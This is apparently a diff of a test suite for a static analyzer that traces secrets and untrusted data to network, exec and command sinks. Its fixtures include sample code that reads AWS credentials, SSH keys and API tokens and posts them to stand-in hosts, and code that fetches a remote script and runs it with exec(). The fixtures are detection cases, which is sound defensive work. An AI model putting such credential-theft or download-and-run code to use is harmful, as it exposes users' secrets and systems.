+            name = "t" * length
+            code = (
+                f"import os, requests\n{name} = os.getenv('K')\nrequests.post('u', data={name})\n"
             )
+            (finding,) = _run(code)
+            assert finding.message.startswith(f"Tainted flow: '{spelled}' from os.getenv (line 2,")
+
+    def test_one_fact_per_key_whatever_the_number_of_sources(self) -> None:
+        """Per-source fact sets multiplied memory; a key keeps one source."""
+
+        def facts(code: str) -> int:
+            parsed = get_python_ast(None, code, "t.py")
+            index = behavioral_taint_tracking._build_scope_index(
+                parsed.tree, parsed.import_aliases, {}
+            )
+            graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
+            graph.run()
+            return sum(len(lane) for slot in graph.facts for lane in slot)
+
+        many = _every_source_in_many_locals(5)
+        one = many.replace(_ALL_SOURCES, "os.getenv('a')")
+        # One fact per key and sink lane, however many sources reach the key.
+        assert facts(many) == facts(one)
+
+    def test_each_flow_fires_at_most_once_per_rank(self, monkeypatch) -> None:
+        """Nested functions forwarding a parameter do not re-fire a wide assignment."""
+        calls = {"n": 0}
+        original = behavioral_taint_tracking._mark_targets
+
+        def counting_mark_targets(*args, **kwargs):
+            calls["n"] += 1
+            return original(*args, **kwargs)
+
+        code = _wide_assignment_in_nested_functions(2000)
+        parsed = get_python_ast(None, code, "t.py")
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
+        graph.build()
+        flows = len(graph.flows) + len(graph.seeds)
+        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
+        _run(code)
+        # Each flow fires at most once per (lane, source rank, bound or not):
+        # twelve times, however many sources the forwarded value carries and
+        # however deep it goes.
+        assert calls["n"] <= 12 * flows
+
+    def test_redefinitions_merge_into_one_class_and_one_callee(self) -> None:
+        parsed = get_python_ast(None, _typed_redefinitions(500), "t.py")
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        (cls,) = index.classes
+        (group,) = cls.methods["m"].values()
+        assert len(group.functions) == 500
+
+    @staticmethod
+    def _raised_in(code: str, cap: int, stage) -> list[str]:
+        """Run *stage* with a deadline that expires after *cap* checks; return the stack."""
+        parsed = get_python_ast(None, code, "t.py")
+        with pytest.raises(_RuntimeBudgetError) as raised:
+            stage(parsed, _capped_check_runtime(cap))
+        return [frame.name for frame in __import__("traceback").extract_tb(raised.tb)]
+
+    def test_deadline_is_checked_while_indexing(self) -> None:
+        def index(parsed, check):
+            behavioral_taint_tracking._build_scope_index(
+                parsed.tree, parsed.import_aliases, {}, check
+            )
+
+        stack = self._raised_in("x + 1\n" * 20000, 5000, index)
+        assert "_build_scope_index" in stack
+        # Name resolution alone also checks the deadline.
+        names = "z = [" + ",".join(f"n{i}" for i in range(20000)) + "]\n"
+        stack = self._raised_in(names, 25000, index)
+        assert "_resolve_names" in stack
 
     def test_deadline_is_checked_per_statement(self) -> None:
         """Calls that bind nothing still pass a deadline check each."""
@@ -1604,7 +2772,21 @@ class TestInterproceduralBounds:
         with pytest.raises(_RuntimeBudgetError):
             graph.build()
 
-    def test_deadline_is_checked_per_propagated_fact(self) -> None:
+    def test_deadline_is_checked_while_linking_callees(self) -> None:
+        """Binding call-site slots into each callee's parameters checks the deadline."""
+        functions = "".join(f"def f{i}(a, b, *c, d=1, **e):\n    return a\n" for i in range(3000))
+        calls = "".join(f"f{i}(1, 2, 3, d=4, e=5)\n" for i in range(3000))
+        parsed = get_python_ast(None, functions + calls, "t.py")
+        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
+        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
+        for node, scope in index.statements:
+            if isinstance(node, behavioral_taint_tracking.ast.Call):
+                graph.call(node, scope)
+        graph.tick = _capped_check_runtime(1000)
+        with pytest.raises(_RuntimeBudgetError):
+            graph.link_callees()
+
+    def test_deadline_is_checked_while_propagating(self) -> None:
         depth = 20000
         code = (
             "import os\n"
@@ -1618,813 +2800,3 @@ class TestInterproceduralBounds:
         graph.tick = _capped_check_runtime(depth // 2)
         with pytest.raises(_RuntimeBudgetError):
             graph.propagate()
-
-    def test_workflow_deadline_stops_an_adversarial_file_promptly(self) -> None:
-        """A crafted file cannot run the analyzer far past the workflow deadline."""
-        code = "class C:\n    pass\n" * 30000 + "C()\n" * 60000
-        start = time.monotonic()
-        result = behavioral_taint_tracking.node(
-            {
-                "components": ["a.py"],
-                "file_cache": {"a.py": code},
-                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=1.0),
-            }
-        )
-        elapsed = time.monotonic() - start
-        assert result["inspection_ledger"][0]["outcome"] in ("completed", "partial")
-        assert elapsed < 8.0
-
-
-def _summary(code: str) -> list[tuple[str, int]]:
-    return sorted((f.rule_id, f.start_line) for f in _run(code))
-
-
-class TestCallReceivers:
-    """Method calls resolve through the receiver's class, scoped like any name."""
-
-    _GITHUB = _code(
-        """
-        import os, requests
-        class GitHub:
-            def create_issue(self, token, body):
-                requests.post("https://api.github.com/issues", headers={"A": token})  # SINK
-        """
-    )
-    _MAIN = _code(
-        """
-        def main():
-            client = GitHub()
-            token = os.environ["GITHUB_TOKEN"]
-            client.create_issue(token, {"title": "t"})
-        """
-    )
-    _FETCH = _code(
-        """
-        def fetch(url):
-            client = requests.Session()
-            return client.get(url)
-        """
-    )
-
-    def test_same_named_library_instance_elsewhere_does_not_hide_binding(self) -> None:
-        for body in (self._MAIN + self._FETCH, self._FETCH + self._MAIN):
-            code = self._GITHUB + body
-            assert _summary(code) == [("TT3", _line(code, "# SINK"))], body
-
-    def test_untyped_parameter_receiver_binds_despite_library_instance_elsewhere(self) -> None:
-        code = (
-            self._GITHUB
-            + _code(
-                """
-            def run(client):
-                token = os.getenv("GITHUB_TOKEN")
-                client.create_issue(token, {})
-            """
-            )
-            + self._FETCH
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-    def test_typed_receiver_reads_only_its_own_class(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Vault:
-                def get(self, name):
-                    return os.getenv(name)
-            class Cache:
-                def get(self, name):
-                    return "public"
-            def publish():
-                c = Cache()
-                val = c.get("status")
-                requests.post("https://x.invalid", data=val)
-            def load():
-                c = Vault()
-                return c.get("TOKEN")
-            """
-        )
-        assert _summary(code) == []
-
-    def test_typed_receiver_binds_only_its_own_class(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Api:
-                def upload(self, body):
-                    print(body)
-            class Mirror:
-                def upload(self, body):
-                    requests.post("https://example.invalid", data=body)
-            def main():
-                api = Api()
-                api.upload(os.getenv("API_TOKEN"))
-            """
-        )
-        assert _summary(code) == []
-
-    def test_method_return_values_reach_the_caller(self) -> None:
-        on_self = _code(
-            """
-            import os, requests
-            class Client:
-                def _token(self):
-                    return os.getenv("API_TOKEN")  # RETURN
-                def send(self):
-                    requests.post("https://example.invalid", data=self._token())
-            """
-        )
-        typed = _code(
-            """
-            import os, requests
-            class Vault:
-                def key(self):
-                    return os.getenv("API_TOKEN")  # RETURN
-            def main():
-                vault = Vault()
-                requests.post("https://example.invalid", data=vault.key())
-            """
-        )
-        static = _code(
-            """
-            import os, requests
-            class Vault:
-                @staticmethod
-                def key():
-                    return os.getenv("API_TOKEN")  # RETURN
-            requests.post("https://example.invalid", data=Vault.key())
-            """
-        )
-        for code, label in ((on_self, "_token()"), (typed, "key()"), (static, "key()")):
-            (finding,) = _flows(code)
-            assert finding.message == (
-                f"Tainted flow: '{label}' from os.getenv (line {_line(code, '# RETURN')}, "
-                "credential/environment) → requests.post (network output)"
-            )
-
-    def test_returns_of_constructed_and_attribute_receivers(self) -> None:
-        """``Cls().m()``, ``cls().m()``, ``self.attr.m()`` and annotated instances."""
-        vault = _code(
-            """
-            import os, requests
-            class Vault:
-                def load(self):
-                    secret = os.environ.get("OPENAI_API_KEY")
-                    return secret
-            """
-        )
-        callers = (
-            "data = Vault().load()",
-            "v: Vault = Vault()\ndata = v.load()",
-        )
-        for caller in callers:
-            code = vault + caller + '\nrequests.post("https://x.invalid", data=data)\n'
-            assert [f.rule_id for f in _run(code)] == ["TT3"], caller
-        on_attribute = vault + _code(
-            """
-            class App:
-                def __init__(self):
-                    self.vault = Vault()
-                def run(self):
-                    requests.post("https://x.invalid", data=self.vault.load())
-            """
-        )
-        from_classmethod = _code(
-            """
-            import os, requests
-            class Vault:
-                def load(self):
-                    return os.environ.get("API_KEY")
-                @classmethod
-                def send(cls):
-                    requests.post("https://x.invalid", data=cls().load())
-            """
-        )
-        for code in (on_attribute, from_classmethod):
-            assert [f.rule_id for f in _run(code)] == ["TT3"], code
-
-    def test_constructed_receiver_returns_feed_exec_and_file_flows(self) -> None:
-        exec_flow = _code(
-            """
-            import requests
-            class Fetcher:
-                def fetch(self):
-                    code = requests.get("https://x.invalid/script").text
-                    return code
-            code = Fetcher().fetch()
-            exec(code)
-            """
-        )
-        file_flow = _code(
-            """
-            import os, requests
-            class Reader:
-                def read(self):
-                    creds = open(os.path.expanduser("~/.aws/credentials")).read()
-                    return creds
-            creds = Reader().read()
-            requests.post("https://x.invalid", data=creds)
-            """
-        )
-        assert [f.rule_id for f in _run(exec_flow)] == ["TT5"]
-        assert [f.rule_id for f in _run(file_flow)] == ["TT4"]
-
-    def test_explicit_unbound_calls_bind_self_explicitly(self) -> None:
-        """``Base.m(self, x)`` passes ``self`` as the first argument, not the receiver."""
-        true_flow = _code(
-            """
-            import os, requests
-            class Base:
-                def __init__(self, token):
-                    requests.post("https://x.invalid", data=token)  # SINK
-            class Child(Base):
-                def __init__(self):
-                    token = os.getenv("TOKEN")
-                    Base.__init__(self, token)
-            """
-        )
-        shifted = _code(
-            """
-            import os, requests
-            class Base:
-                def __init__(self, user, body):
-                    print(user)
-                    requests.post("https://x.invalid", data=body)
-            class Child(Base):
-                def __init__(self):
-                    Base.__init__(self, os.getenv("USER_NAME"), "public")
-            """
-        )
-        thread = _code(
-            """
-            import os, requests, threading
-            class Base:
-                def send(self, payload):
-                    requests.post("https://x.invalid", data=payload)  # SINK
-            def main(obj):
-                token = os.getenv("TOKEN")
-                threading.Thread(target=Base.send, args=(obj, token)).start()
-            """
-        )
-        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
-        assert _summary(shifted) == []
-        assert _summary(thread) == [("TT3", _line(thread, "# SINK"))]
-
-    def test_super_calls_follow_the_method_resolution_order(self) -> None:
-        unrelated_init = _code(
-            """
-            import os, requests
-            class Credentials:
-                def __init__(self, token):
-                    self.token = token
-            class EnvCredentials(Credentials):
-                def __init__(self):
-                    super().__init__(os.environ.get("API_TOKEN"))
-            class Downloader:
-                def __init__(self, url):
-                    self.url = url
-                def fetch(self):
-                    return requests.get(self.url, timeout=10)
-            class ApiError(Exception):
-                def __init__(self, message):
-                    super().__init__(message)
-            def run(cmd):
-                raise ApiError(requests.get(cmd).text)
-            """
-        )
-        returned = _code(
-            """
-            import os, requests
-            class Base:
-                def auth(self):
-                    token = os.environ["TOKEN"]
-                    return token
-            class Child(Base):
-                def send(self):
-                    token = super().auth()
-                    requests.post("https://x.invalid", data=token)  # ZERO_ARG
-                def send2(self):
-                    requests.post("https://x.invalid", data=super(Child, self).auth())  # TWO_ARG
-            """
-        )
-        overridden = _code(
-            """
-            import os, requests
-            class Base:
-                def send(self, payload):
-                    print(payload)
-                def auth(self):
-                    return "public"
-            class Child(Base):
-                def send(self, payload):
-                    requests.post("https://x.invalid", data=payload)
-                def auth(self):
-                    return os.getenv("TOKEN")
-                def run(self):
-                    super().send(os.getenv("TOKEN"))
-                    requests.post("https://x.invalid", data=super().auth())
-            """
-        )
-        assert _summary(unrelated_init) == []
-        assert _summary(overridden) == []
-        assert _summary(returned) == [
-            ("TT3", _line(returned, "# ZERO_ARG")),
-            ("TT3", _line(returned, "# TWO_ARG")),
-        ]
-
-    def test_literal_receivers_never_bind_into_module_methods(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            MODELS = {"small": "s"}
-            class Uploader:
-                def __init__(self, url):
-                    self.url = url
-                def format(self, record):
-                    return requests.post(self.url, json={"record": record}, timeout=10)
-                def get(self, model_id):
-                    return requests.get(f"https://models.invalid/{model_id}")
-            def banner():
-                user = os.environ.get("USER", "unknown")
-                return "Running as {}".format(user)
-            def selected_model():
-                options = {}
-                options.get(os.environ.get("MODEL"))
-                return MODELS.get(os.environ.get("MODEL_SIZE", "small"))
-            """
-        )
-        assert _summary(code) == []
-
-    def test_cls_constructor_and_property_reads(self) -> None:
-        cls_constructor = _code(
-            """
-            import os, requests
-            class Client:
-                def __init__(self, token):
-                    self.resp = requests.post("https://auth.invalid", data={"token": token})  # SINK
-                @classmethod
-                def from_env(cls):
-                    token = os.environ.get("API_TOKEN")
-                    return cls(token)
-            """
-        )
-        on_self = _code(
-            """
-            import os, requests
-            class Client:
-                @property
-                def api_key(self):
-                    api_key = os.environ.get("API_KEY")
-                    return api_key
-                def call(self):
-                    key = self.api_key
-                    requests.post("https://x.invalid", headers={"X-API-Key": key})  # SINK
-            """
-        )
-        on_instance = _code(
-            """
-            import os, requests
-            class Config:
-                @property
-                def token(self):
-                    return os.getenv("GITHUB_TOKEN")
-            cfg = Config()
-            requests.post("https://x.invalid", data=cfg.token)  # SINK
-            """
-        )
-        for code in (cls_constructor, on_self, on_instance):
-            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code
-
-    def test_callbacks_on_attribute_constructor_and_parameter_receivers(self) -> None:
-        sender = _code(
-            """
-            import os, requests, threading
-            class Sender:
-                def send(self, token):
-                    requests.post("https://x.invalid", data=token)  # SINK
-            """
-        )
-        for setup, target in (
-            ("self.sender = Sender()", "self.sender.send"),
-            ("pass", "Sender().send"),
-            ("pass", "sender.send"),
-        ):
-            code = sender + _code(
-                f"""
-                class App:
-                    def __init__(self):
-                        {setup}
-                    def run(self, sender):
-                        token = os.getenv("GITHUB_TOKEN")
-                        threading.Thread(target={target}, args=(token,)).start()
-                """
-            )
-            assert _summary(code) == [("TT3", _line(code, "# SINK"))], target
-
-
-class TestClassHierarchies:
-    """Attributes and methods are shared along inheritance, not across siblings."""
-
-    def test_sibling_subclasses_do_not_share_attributes(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class ChatProvider:
-                def chat(self, messages):
-                    raise NotImplementedError
-            class NvidiaProvider(ChatProvider):
-                def __init__(self):
-                    self.headers = {"Authorization": os.environ.get("NVIDIA_API_KEY")}
-                def chat(self, messages):
-                    return requests.post("https://nvidia.invalid", headers=self.headers)  # REAL
-            class OllamaProvider(ChatProvider):
-                def __init__(self):
-                    self.headers = {"Content-Type": "application/json"}
-                def chat(self, messages):
-                    return requests.post("http://localhost:11434", headers=self.headers)
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# REAL"))]
-
-    def test_sibling_subclasses_do_not_share_methods(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Backend:
-                pass
-            class CloudBackend(Backend):
-                def auth_token(self):
-                    return os.environ.get("CLOUD_TOKEN")
-            class LocalBackend(Backend):
-                def auth_token(self):
-                    return "anonymous"
-                def health(self):
-                    return requests.get("http://localhost", params={"u": self.auth_token()})
-            """
-        )
-        assert _summary(code) == []
-
-    def test_attributes_meet_through_subclasses_and_mixins(self) -> None:
-        set_in_subclass = _code(
-            """
-            import os, requests
-            class Base:
-                def send(self):
-                    requests.post("https://x.invalid", data=self.token)  # SINK
-            class Child(Base):
-                def __init__(self):
-                    self.token = os.getenv("API_TOKEN")
-            """
-        )
-        mixin = _code(
-            """
-            import os, requests
-            class TokenStore:
-                def __init__(self):
-                    self.token = os.environ.get("API_KEY")
-            class SenderMixin:
-                def send(self, url):
-                    return requests.post(url, headers={"A": self.token})  # SINK
-            class Client(TokenStore, SenderMixin):
-                pass
-            """
-        )
-        for code in (set_in_subclass, mixin):
-            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code
-
-    def test_overridden_method_in_subclass_is_reached_from_the_base(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Base:
-                def token(self):
-                    return "public"
-                def send(self):
-                    requests.post("https://x.invalid", data=self.token())  # SINK
-            class Child(Base):
-                def token(self):
-                    return os.getenv("API_TOKEN")
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-
-class TestContextSensitivity:
-    """One caller's secret must not taint other calls of the same helper."""
-
-    def test_helper_result_is_tainted_only_where_the_secret_is_passed(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def _headers(token=None):
-                h = {"Accept": "application/json"}
-                if token:
-                    h = {"Accept": "application/json", "Authorization": f"Bearer {token}"}
-                return h
-            def private_api():
-                return requests.get("https://api.invalid/me", headers=_headers(os.environ["T"]))  # SINK
-            def public_status():
-                return requests.post("https://status.invalid/ping", headers=_headers())
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-    def test_pure_transform_helper_does_not_leak_between_callers(self) -> None:
-        code = _code(
-            """
-            import os, json, requests
-            def to_json(obj):
-                return json.dumps(obj, indent=2)
-            def save_config():
-                cfg = {"api_key": os.getenv("API_KEY")}
-                print(to_json(cfg))
-            def report(results):
-                requests.post("https://telemetry.invalid", data=to_json(results))
-            """
-        )
-        assert _summary(code) == []
-
-    def test_secrets_still_flow_through_helpers_globals_and_attributes(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            CACHE = {}
-            def remember(value):
-                global TOKEN
-                TOKEN = value
-            class Holder:
-                def keep(self, value):
-                    self.value = value
-                def send(self):
-                    requests.post("https://x.invalid", data=self.value)  # ATTR
-            def wrap(value):
-                return {"v": value}
-            def main(holder: Holder):
-                secret = os.getenv("API_KEY")
-                remember(secret)
-                Holder().keep(secret)
-                requests.post("https://x.invalid", json=wrap(secret))  # ARG
-            def later():
-                requests.post("https://x.invalid", data=TOKEN)  # GLOBAL
-            """
-        )
-        assert _summary(code) == sorted(
-            ("TT3", _line(code, marker)) for marker in ("# ATTR", "# ARG", "# GLOBAL")
-        )
-
-    def test_inline_source_through_a_helper_is_reported_once(self) -> None:
-        network = _code(
-            """
-            import requests
-            def wrap(text):
-                return {"q": text}
-            requests.post("https://api.invalid/search", json=wrap(input("query: ")))
-            """
-        )
-        command = _code(
-            """
-            import os, subprocess
-            def make_cmd(binary):
-                return [binary, "--version"]
-            subprocess.run(make_cmd(os.environ.get("TOOL_BIN")))
-            """
-        )
-        assert [f.rule_id for f in _run(network)] == ["TT1"]
-        assert [f.rule_id for f in _run(command)] == ["TT1"]
-
-
-class TestMultipleSources:
-    """A key keeps one fact per source; the sink reports the most severe rule."""
-
-    def test_helper_defined_first_does_not_preempt_the_credential(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def nonce():
-                return requests.get("https://collector.invalid/nonce").text
-            def run():
-                token = os.getenv("API_KEY")
-                body = nonce() + token  # BODY
-                requests.post("https://collector.invalid/upload", data=body)
-            """
-        )
-        (finding,) = _run(code)
-        assert finding.rule_id == "TT3"
-        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message
-
-    def test_file_read_helper_does_not_preempt_the_credential(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def read_key():
-                return open(os.path.expanduser("~/.ssh/id_rsa")).read()
-            def collect():
-                aws = os.environ["AWS_SECRET_ACCESS_KEY"]
-                loot = {"key": read_key(), "aws": aws}
-                requests.post("https://collector.invalid/x", json=loot)
-            """
-        )
-        assert [f.rule_id for f in _run(code)] == ["TT3"]
-
-    def test_reassignment_keeps_the_most_severe_source_in_either_order(self) -> None:
-        for first, second in (
-            ('open("notes.txt").read()', 'os.getenv("KEY")'),
-            ('os.getenv("KEY")', 'open("notes.txt").read()'),
-        ):
-            code = (
-                "import os, requests\n"
-                f"payload = {first}\n"
-                f"payload = {second}\n"
-                "body = payload\n"
-                'requests.post("https://x.invalid", data=body)\n'
-            )
-            assert [f.rule_id for f in _run(code)] == ["TT3"], first
-
-
-class TestLambdaAndComprehensionScopes:
-    """Lambdas and comprehensions are scopes of their own, as in Python 3."""
-
-    def test_walrus_inside_a_lambda_does_not_shadow_a_global(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            TOKEN = os.getenv("API_TOKEN")
-            def send():
-                reset = lambda: (TOKEN := None)
-                requests.post("https://x.invalid", data=TOKEN)  # SINK
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-    def test_walrus_inside_a_comprehension_binds_in_the_function(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            TOKEN = os.getenv("API_TOKEN")
-            def send():
-                [(TOKEN := "public") for _ in range(1)]
-                requests.post("https://x.invalid", data=TOKEN)
-            """
-        )
-        assert _summary(code) == []
-
-    def test_lambda_assigned_to_a_name_binds_call_arguments(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            post_secret = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
-            def main():
-                value = os.getenv("API_TOKEN")
-                post_secret(value)
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-    def test_lambda_parameters_are_local(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            payload = os.getenv("API_TOKEN")
-            send = lambda payload: requests.post("https://x.invalid", data=payload)
-            send("public")
-            """
-        )
-        assert _summary(code) == []
-
-    def test_comprehension_targets_are_local(self) -> None:
-        into_callee = _code(
-            """
-            import os, requests
-            url = os.getenv("WEBHOOK_URL")
-            def ping(u):
-                requests.get(u, timeout=5)
-            def check(urls):
-                return [ping(url) for url in urls]
-            """
-        )
-        direct_sink = _code(
-            """
-            import os, requests
-            url = os.getenv("WEBHOOK_URL")
-            def check(urls):
-                return [requests.get(url, timeout=5) for url in urls]
-            """
-        )
-        outer_name = _code(
-            """
-            import os, requests
-            token = os.getenv("API_TOKEN")
-            def send():
-                labels = [token for token in ("a", "b")]
-                requests.post("https://x.invalid", data=token)  # SINK
-            """
-        )
-        assert _summary(into_callee) == []
-        assert _summary(direct_sink) == []
-        assert _summary(outer_name) == [("TT3", _line(outer_name, "# SINK"))]
-
-    def test_comprehension_over_tainted_data_taints_its_target(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def send(names):
-                secrets = [os.getenv(name) for name in names]
-                for value in [s for s in secrets]:
-                    pass
-                [requests.post("https://x.invalid", data=s) for s in secrets]  # SINK
-            """
-        )
-        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
-
-
-class TestRecallAndPrecisionPaths:
-    """Each path below is pinned so that removing it fails a test."""
-
-    def test_recall_paths(self) -> None:
-        cases = (
-            # keyword-only defaults
-            """
-            import os, requests
-            def send(*, value=os.getenv("API_KEY")):
-                requests.post("https://x.invalid", data=value)  # SINK
-            send()
-            """,
-            # Thread kwargs
-            """
-            import os, requests, threading
-            def upload(body):
-                requests.post("https://x.invalid", data=body)  # SINK
-            def main():
-                secret = os.getenv("API_KEY")
-                threading.Thread(target=upload, kwargs={"body": secret}).start()
-            """,
-            # class attribute read through the class name
-            """
-            import os, requests
-            class Config:
-                TOKEN = os.getenv("API_TOKEN")
-            def send():
-                requests.post("https://x.invalid", data=Config.TOKEN)  # SINK
-            """,
-            # defaults are evaluated in the defining class body
-            """
-            import os, requests
-            class Client:
-                TOKEN = os.getenv("API_TOKEN")
-                def send(self, token=TOKEN):
-                    requests.post("https://x.invalid", data=token)  # SINK
-            """,
-        )
-        for case in cases:
-            code = _code(case)
-            assert _summary(code) == [("TT3", _line(code, "# SINK"))], case
-
-    def test_precision_guards(self) -> None:
-        cases = (
-            # an untyped receiver never reads a same-named module method's return
-            """
-            import os, requests
-            class Settings:
-                def get(self, name):
-                    return os.getenv(name)
-            def fetch(params):
-                url = params.get("url")
-                return requests.get(url)
-            """,
-            # a library-typed receiver does not bind into a same-named module method
-            """
-            import os, requests
-            class Api:
-                def get(self, url):
-                    requests.get(url)
-            def main():
-                token = os.getenv("API_TOKEN")
-                session = requests.Session()
-                session.get(token)
-            """,
-            # class-body names are not visible to methods
-            """
-            import os, requests
-            token = "public"
-            class Client:
-                token = os.getenv("API_TOKEN")
-                def send(self):
-                    requests.post("https://x.invalid", data=token)
-            """,
-            # an explicit dunder call on an unknown object binds nowhere
-            """
-            import os, requests
-            class Auth:
-                def __init__(self, token):
-                    self.token = token
-            def make(auth):
-                auth.__init__(os.getenv("GITHUB_TOKEN"))
-            class Downloader:
-                def __init__(self, url):
-                    self.url = url
-                def fetch(self):
-                    return requests.get(self.url, timeout=10)
-            """,
-        )
-        for case in cases:
-            assert _summary(_code(case)) == [], case
